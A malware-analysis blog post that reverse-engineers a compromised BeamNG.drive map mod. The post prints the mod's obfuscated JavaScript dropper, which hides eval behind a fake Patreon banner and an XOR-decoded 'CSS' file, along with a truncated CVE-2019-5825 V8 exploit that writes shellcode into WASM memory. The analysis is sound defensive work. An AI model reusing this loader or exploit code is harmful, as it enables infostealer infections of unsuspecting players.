Last week, I fired up [BeamNG.drive](https://www.beamng.com/game/) hoping to enjoy a ride around Belasco City.
But, just after I launched the game, I noticed an odd notification from my antivirus software.

![AV alert](/assets/beamng-av-alert.png)

`curl.exe`? That can't be good.
Cloudflare Radar [confirmed](https://radar.cloudflare.com/scan/a5c7ceb7-ec86-456f-adfc-dbfa1e8c41ba/summary) the domain `curl` tried to access is known to be malicious.
At this point, however, I wasn't 100% sure this came from the game.

## Starting the investigation

To find out if the problem was indeed in the game, I re-launched it with [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) running.
Filtering through the events, my suspicion was confirmed: a process launching `cmd` with a `curl` command was spawned by the game.

![Process monitor screenshot](/assets/beamng-procmon.png)

But where exactly was this command coming from? Was it a mod, or was the game itself compromised?

Inspecting the call stack in Process Monitor shows the command was executed by calling [`WinExec`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec), a legacy function from 16-bit Windows that is commonly used in shellcode malware.

![Stack screenshot](/assets/beamng-procmon-stack.png)

To take a closer look, I attached the [WinDbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/) debugger to the game process and set a breakpoint on `WinExec`.
When the malicious code tries to run the command, the debugger will pause the process and allow me to inspect the call stack and memory.
That breakpoint was hit at the exact moment I opened the in-game mod manager.

WinDbg shows which memory address `WinExec` was called at, and we can use that to find the shellcode that executed the command.

![WinDbg screenshot](/assets/beamng-windbg.png)

But how did this shellcode even get there in the first place?
Unfortunately, the call stack doesn't show us which file it came from, but it does contain another clue: `libcef`.
This refers to the [Chromium Embedded Framework](https://bitbucket.org/chromiumembedded/cef), which suggests a vulnerability in Chromium might have been exploited to insert the shellcode into memory.
BeamNG.drive uses Chromium to render parts of the UI, including the mod manager where the malicious code was executed.

I disabled all my downloaded mods and dug deeper.

## The mod

I had a few more clues to help narrow down my search:

1. When I previously played the game 2 months ago, there was nothing suspicious.
2. The malicious command was spawned when I opened the in-game mod manager.
3. Disabling all mods stopped the suspicious event from appearing.

Using this info, I focused on the mods I had installed or updated in the last 2 months.
After unpacking the mod `.zip` files and searching through dozens upon dozens of Lua files, I found... nothing.
Looking through that many files was just too slow. I needed to find out exactly which mod was causing the problem.

With any luck, the moment I enabled the problematic mod, the suspicious event would reappear, so I started to enable them one by one.
And sure enough, it came back when I turned on a mod called *American Road*.

## The dropper

Now that I knew which mod was the culprit, finding the malicious code should be much easier.

### First stage

It didn't take long to find some suspicious JavaScript code in a file named `american_road_patreon_banner.js`.

```javascript
// create banner and load compiled css
const baseFolder = "/ui/modModules/american_road_patreon_banner"
var xhr = new XMLHttpRequest();
xhr.open('GET', baseFolder + "/banner.c_css", true);
xhr.responseType = "arraybuffer"; 
xhr.onload = () => {
  if (xhr.status === 200) {
    var compiledcss = new TextDecoder().decode(xhr.response);
    var styles = ((s, k) => [...s]
    .map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ k.charCodeAt(i % k.length)))
    .join(''))(compiledcss, "css");
    setTimeout(() => {
      var bannerImage = document.createElement("img", [].constructor.constructor(styles)());
      bannerImage.id = "patreon-banner"
      bannerImage.src = baseFolder + "/banner.gif";
      bannerImage.style = "display:none; padding-top: 2.6rem;";
      document.body.appendChild(bannerImage);
    }, 500)      
  }
};
xhr.send();

// handle showing and hiding of banner
// when the player is on american road and is in the escape menu, the banner will show
export default angular.module('american_road_patreon_banner', ['ui.router'])
.config(['$stateProvider', function($stateProvider) {
  $stateProvider.state('menu.american_road_patreon_banner', {
    url: '/american_road_patreon_banner',
    templateUrl: '/ui/modModules/american_road_patreon_banner/american_road_patreon_banner.html',
    controller: 'AMPatreonBannerController',
  })
}])
// ...irrelevant code truncated
```

At first glance, this looks like a harmless script that shows a Patreon banner when the player uses the *American Road* map.
But on closer inspection, there are a few things that look off:

- The `american_road_patreon_banner.html` file that's referenced in the script does not actually exist.
- It attempts to load a "compiled CSS" file called `banner.c_css` using an `XMLHttpRequest`, which seems unnecessarily complex.

  ```javascript
  var xhr = new XMLHttpRequest();
  xhr.open('GET', baseFolder + "/banner.c_css", true);
  xhr.responseType = "arraybuffer"; 
  ```

- After loading the "compiled CSS", the script decodes it using bitwise XOR with the string `css`.

  ```javascript
  var compiledcss = new TextDecoder().decode(xhr.response);
  var styles = ((s, k) => [...s]
  .map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ k.charCodeAt(i % k.length)))
  .join(''))(compiledcss, "css");
  ```

The most suspicious part is `[].constructor.constructor(styles)()`.
Let's break this expression down into its components:

- `[]` is an empty array literal.
- `[].constructor` is the constructor of the array type, which is a function.
- Functions in JavaScript are objects too, of the `Function` type, so `[].constructor.constructor` is the [constructor of the `Function` type](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function#constructor).
- `(styles)` calls the `Function` constructor creating a new function from the string `styles`.
- `()` calls the newly created function.

A deobfuscated version of this would look like `Function(styles)()`, which is essentially the same as `eval(styles)`, but disguised to seem like legitimate code.

Another interesting file is a Lua script that reloads the user interface after the mod is loaded, which the author of the dropper was kind enough to document for us.

```lua
-- beamng race condition causes ui files from mods to not be found when the ui gets loaded
-- since the mod zip file gets mounted AFTER the ui loads.
-- we reload once to load all missing ui modules
reloadUI()
```

Obviously, there was quite a bit of effort put into testing this dropper and ensuring it executes the JavaScript code.
They even went as far as finding the correct Patreon link of the original mod author for the GIF banner image.

We've now established that this code is dynamically executing some hidden JavaScript, but what exactly is it executing?

### Second stage

Remember that "compiled CSS" file? The first 3 lines look like this:

```text
␏␖ C␐␜
␅␖␑ ␚␌␝,␁␆␕␅␖␁^␝␖␔S2␑␁␒␚1␆␅␕␖␑[KJ_␕␏␜␒␗,␅
␖␄^␝␖␔S5␏␜␒␗EG"␁␁␂
```

Clearly, the data is not in plain text, so we need to decode it.
I used this snippet from the original JavaScript, replacing the `eval`-like part with `console.log` to see the decoded data.
I also replaced the `XMLHttpRequest` with `fs.readFileSync` and then ran it with Node.js inside a virtual machine.

```javascript
import fs from "node:fs";

const data = fs.readFileSync("banner.c_css");

var compiledcss = new TextDecoder().decode(data);
var styles = ((s, k) => [...s]
.map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ k.charCodeAt(i % k.length)))
.join(''))(compiledcss, "css");

console.log(styles);
```

This gives us the second stage of the dropper:

    });
}
function parse_css() {
    const r = new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96,
            0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 6, 129, 128, 128,

            128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 0, 11,
        ]),
        t = new WebAssembly.Instance(new WebAssembly.Module(r)).exports.a;
    gfxbuffer();
    let n = rq(addrof(t) - 1n + 24n) - 1n,
        e = rq(n + 8n) - 1n,
        a = rq(e + 16n) - 1n;
    cpy(
        rq(a + 0xe8n) + 0n,
        [
            72, 131, 236, // ...truncated
        ],
    ),
        setTimeout(t, 1e3);
}
parse_css();
```

There's a lot going on here, but in essence this code exploits [CVE-2019-5825](https://nvd.nist.gov/vuln/detail/CVE-2019-5825), a 6-year-old vulnerability in Chromium's V8 JavaScript engine, to write machine code to an out-of-bounds executable memory location.
The code above is an almost identical copy of [this proof-of-concept](https://github.com/exodusintel/Chromium-941743/blob/master/exp.js) on GitHub.

- We start with a WebAssembly module that is defined and instantiated in the JavaScript.

  ```javascript
  const r = new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96,
            0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 6, 129, 128, 128,
            128, 0, 0, 7, 133, 128, 128, 128, 0, 1, 1, 97, 0, 0, 10, 138,
            128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 0, 11,
        ]),
        t = new WebAssembly.Instance(new WebAssembly.Module(r)).exports.a;
  ```

  The contents of this module are not really important, as long as it exports a function.
  In this case, it's a function called `a` that returns `0`.

  ```wasm
  (module
    (type (;0;) (func (result i32)))
    (func (;0;) (type 0) (result i32)
      i32.const 0
    )
    (export "a" (func 0))
  )
  ```

- The `gfxbuffer` function sets the stage for out-of-bounds memory reading and writing.

- The memory address of the WASM `a` function is determined.

  ```javascript
  let n = rq(addrof(t) - 1n + 24n) - 1n,
      e = rq(n + 8n) - 1n,
      a = rq(e + 16n) - 1n;
  ```

- A shellcode is copied into where the `a` function is located in memory.

  ```javascript
  cpy(
      rq(a + 0xe8n) + 0n,
      [
          72, 131, 236, // ...truncated
      ],
  ),
  ```

- Finally, the now-modified `a` function is scheduled to run after a 1-second delay.

  ```javascript
  setTimeout(t, 1e3);
  ```

- To make this work, a few primitives are defined:

  - `addrof`: gets the address of an object in memory.
  - `rq`: likely stands for "read quadword", and reads a 64-bit value from a memory address.
  - `wq`: similarly, probably "write quadword", and writes a 64-bit value to memory at a specified address.
  - `cpy`: copies an array of values to a specified memory location.

### Third stage: the shellcode

The data that is copied into executable memory is the shellcode payload we're looking for.
Going deeper down this rabbit hole, we can write the bytes to a file to get a better look at it.

```javascript
import fs from "node:fs";

const r = new Uint8Array([
    72, 131, 236, // ...truncated
]);

fs.writeFileSync("shellcode.bin", r);
```

Viewing the resulting file in a hex or text editor reveals the original `curl` command we saw in Process Monitor and WinDbg:

```

```

The bytes before the command are probably x86 instructions that locate and call the `WinExec` function, which is responsible for executing the command.

## The payload

All the code we've seen so far is just to download and execute a DLL file from the Internet.
This DLL is the real malware and a quick [analysis](https://tria.ge/250420-gjl4rsxnx5/behavioral1) reveals it's an infostealer that steals passwords from browsers and the Exodus crypto wallet app.

## So, what now?

After determining which mod is infected, I reached out to the BeamNG team with details about the mod and the malicious code.
Within a few days, the infected mod version was removed from the official repository, and its author's account was suspended because it is very likely compromised.

If you have *American Road* installed, you should **remove it** and scan your computer for malware.
I also recommend **changing all your passwords**, as it's possible they might have been stolen if your antivirus didn't stop the DLL from executing.

Looking through the [mod's page](https://www.beamng.com/resources/american-road.3100/) on the BeamNG website, I found the malicious code was added on April 1st.
The changelog stating "added patreon banner" was the final nail in the coffin.
Unfortunately, over 3,500 people had already downloaded the compromised version of the mod before it was removed, so it's possible that some had their passwords or personal information stolen.
VirusTotal [reports](https://www.virustotal.com/gui/file/9ec86514d5993782d455a4c9717ec4f06d0dfcd556e8de6cf0f8346b8b8629d4/detection) that most antivirus programs detect the DLL as malicious, including Microsoft Windows Defender, but there is about a one-week gap between the April 1st update and the first analysis.

While writing this post, I was using BeamNG.drive version 0.34, which comes with version `3.3626.1895.g7001d56` of the Chromium Embedded Framework (CEF) from March 2019.
However, in version [0.35](https://www.beamng.com/game/news/patch/beamng-drive-v0-35/) of the game released on April 2nd (the day after the malicious mod update), the CEF dependency was updated to the much more recent version `130.1.16+g5a7e5ed`.
This means that fortunately, this particular exploit has already been patched in the latest version of the game, which probably greatly reduced the impact, but older versions are vulnerable to this and similar exploits.

Another notable detail is BeamNG.drive uses the `--no-sandbox` flag for its subprocesses, which likely allowed the exploit to work in the first place, so removing it would be a good idea as well.

Perhaps I'll make a follow-up post reverse-engineering the shellcode and analyzing the DLL in more detail, so stay tuned!

## Summary

In this post, we looked at an infected mod for BeamNG.drive that included obfuscated JavaScript and shellcode.
Starting with an antivirus alert, we used Process Monitor and WinDbg to gather important details, and then uncovered each layer of the malicious code with reverse engineering.
We found that a Chromium vulnerability involving WASM and out-of-bounds memory access was exploited to write shellcode into executable memory.
Finally, we discovered that the shellcode downloads a malicious DLL file that steals passwords and personal information.

Shout-out to [Elliott](https://elliott.diy/) for helping out with the DLL analysis, and a big thank-you to my dad for walking me through WinDbg!
